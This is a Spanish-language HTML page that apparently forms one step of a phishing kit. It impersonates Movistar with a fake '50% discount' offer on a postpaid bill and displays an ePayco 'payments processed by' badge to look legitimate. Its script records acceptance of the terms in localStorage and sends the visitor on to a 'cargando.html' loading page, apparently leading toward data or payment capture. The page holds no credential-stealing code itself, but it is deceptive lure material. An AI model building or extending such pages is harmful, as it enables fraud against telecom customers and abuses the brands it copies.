<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Promoción Movistar</title>
  <style>
    body {
      background: #f5f9fc;
      color: #333;
      font-family: Arial, sans-serif;
      margin: 0;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }
    /* Header estilo Validar línea */
    header {
      background-color: #fff;
      padding: 1rem;
      text-align: center;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
    }
    header img {
      max-height: 50px;
    }
    main {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .card {
      background: linear-gradient(180deg,#ffffff,#e6f6ff);
      padding: 28px;
      border-radius: 16px;
      width: 380px;
      box-shadow: 0 6px 20px rgba(0,0,0,0.15);
      text-align: center;
    }
    h2 { 
      margin: 0 0 12px; 
      color: #019DF4; 
    }
    p { 
      margin: 0 0 18px; 
      color: #444; 
      font-size: 0.95rem; 
      line-height: 1.4; 
    }
    .terms {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 0.9rem;
      color: #333;
      margin: 16px 0;
      text-align: left;
    }
    input[type="checkbox"] {
      accent-color: #019DF4;
      width: 18px;
      height: 18px;
    }
    .actions {
      margin-top: 16px;
      display: flex;
      gap: 10px;
    }
    button {
      flex: 1;
      padding: 11px;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      font-weight: 700;
      font-size: 0.95rem;
    }
    .accept { background: #5bc500; color: #fff; }
    .cancel { background: #263648; color: #cfefff; }
    .msg { margin-top:12px; font-size:0.95rem; color:#019DF4; }
    footer {
      background: #f0f0f0;
      padding: 10px 20px;
      text-align: center;
      font-size: 0.85rem;
      color: #444;
    }
    footer img {
      height: 16px;
      vertical-align: middle;
      margin: 0 4px;
    }
    .lock-icon {
      height: 18px;
      vertical-align: middle;
      margin-right: 6px;
    }
  </style>
</head>
<body>
  <!-- Banner estilo Validar línea -->
  <header>
    <img src="img/descarga.png" alt="Logo Movistar">
  </header>

  <!-- Contenido -->
  <main>
    <div class="card">
      <h2>¡Genial!</h2>
      <p>Tu plan pospago es válido para la promoción del <b>50% de descuento</b> en tu factura.</p>
      <p>Acepta los términos y condiciones para continuar.</p>

      <div class="terms">
        <input type="checkbox" id="tyc" />
        <label for="tyc">Acepto los términos y condiciones</label>
      </div>

      <div class="actions">
        <button class="cancel" id="volver">Volver</button>
        <button class="accept" id="continuar">Continuar</button>
      </div>

      <div class="msg" id="msg"></div>
    </div>
  </main>

  <!-- Footer -->
  <footer>
    <img src="img/png-transparent-computer-icons-password-login-user-padlock-miscellaneous-christianity-rectangle.png" alt="Candado" class="lock-icon">
    Pagos procesados por 
    <img src="img/logo_ePayco.1722863467828.png" alt="ePayco">
  </footer>

  <script>
    document.getElementById('volver').addEventListener('click', () => {
      window.location.href = 'cargando.html';
    });

    document.getElementById('continuar').addEventListener('click', () => {
      const msgEl = document.getElementById('msg');
      const tyc = document.getElementById('tyc').checked;

      if (!tyc) {
        msgEl.textContent = "Debes aceptar los términos y condiciones para continuar.";
        return;
      }

      msgEl.textContent = "Procesando aceptación...";

      // Guardar estado en localStorage
      localStorage.setItem("promoAceptada", "true");

      setTimeout(() => {
        window.location.href = "cargando.html";
      }, 1000);
    });
  </script>
</body>
</html>
